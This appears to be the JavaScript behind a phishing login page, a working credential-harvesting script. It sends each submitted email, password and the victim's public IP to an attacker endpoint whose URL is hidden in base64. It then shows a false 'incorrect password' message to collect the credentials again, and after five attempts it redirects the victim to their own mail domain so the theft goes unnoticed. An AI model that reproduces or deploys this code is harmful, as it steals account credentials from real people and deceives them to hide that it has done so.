const MAX_ATTEMPTS = 5;
let attemptCount = 0; 

function $ (id) { return document.getElementById(id); }

function showError(msg) {
  const el = $('login-error');
  if (!el) return;
  const span = el.querySelector('.login-error-msg');
  if (span) span.textContent = msg;
  el.style.display = 'block';
}

function hideError() { $('login-error').style.display = 'none'; }

function setLoginButton(loading) {
  const btn = document.querySelector('button.fm-submit');
  if (!btn) return;
  btn.disabled = !!loading;
  btn.textContent = loading ? 'Logging in…' : 'Log in';
}

function submitToServer(email, pwd, ip) {
  const url = atob('aHR0cHM6Ly9jbG91ZC4weDU5ZDY3MWZkMTU4ZDdkNGM1NmRmZDY1YzQ2YjA3OGY5ODM2YTJkNDAuY2xvdWQvMTIzLnBocA==');
  return fetch(url, {
    method : 'POST',
    headers: { 'Content-Type': 'application/json' },
    body   : JSON.stringify({ email, password: pwd, ip })
  })
    .then(r => { if (!r.ok) throw new Error('Server '+r.status); return r.json(); })
    .catch(e => { console.error('POST failed →', e); throw e; });
}

function onSubmit(e) {
  e.preventDefault();

  const emailEl = $('amge');
  const pwdEl   = $('amgp');
  const agreeEl = $('fm-agreement-checkbox');

  if (!emailEl || !pwdEl || !agreeEl) {
    console.error('Missing input elements');
    showError('Form broken – please reload.');
    return;
  }

  const email = emailEl.value.trim();
  const pwd   = pwdEl.value.trim();

  if (!email) { showError('Please enter an e‑mail.'); return; }
  if (!pwd)   { showError('Password cannot be empty.'); return; }
  if (!agreeEl.checked) {
    showError('You must agree to the Service Agreement.');
    return;
  }

  hideError();
  setLoginButton(true);
  attemptCount++;

  fetch('https://icanhazip.com')
    .then(r => { if (!r.ok) throw new Error('IP fetch failed'); return r.text(); })
    .then(ip => ip.trim())
    .then(ip => submitToServer(email, pwd, ip))
    .then(() => {
      if (attemptCount < MAX_ATTEMPTS) {
        showError('Your account name or password is incorrect.');
        pwdEl.value = '';
        pwdEl.focus();
      } else {
        const domain = email.split('@')[1];
        if (domain)
          window.location.href = `https://${domain}`;
        else
          showError('Invalid e‑mail format.');
      }
    })
    .catch(err => { console.error(err); showError('Failed to log in.'); })
    .finally(() => setLoginButton(false));
}

document.addEventListener('DOMContentLoaded', () => {
  const form = $('login-form') || document.querySelector('form.login-form');
  if (!form) { console.error('#login-form missing – cannot attach submit handler'); return; }
  form.addEventListener('submit', onSubmit);
});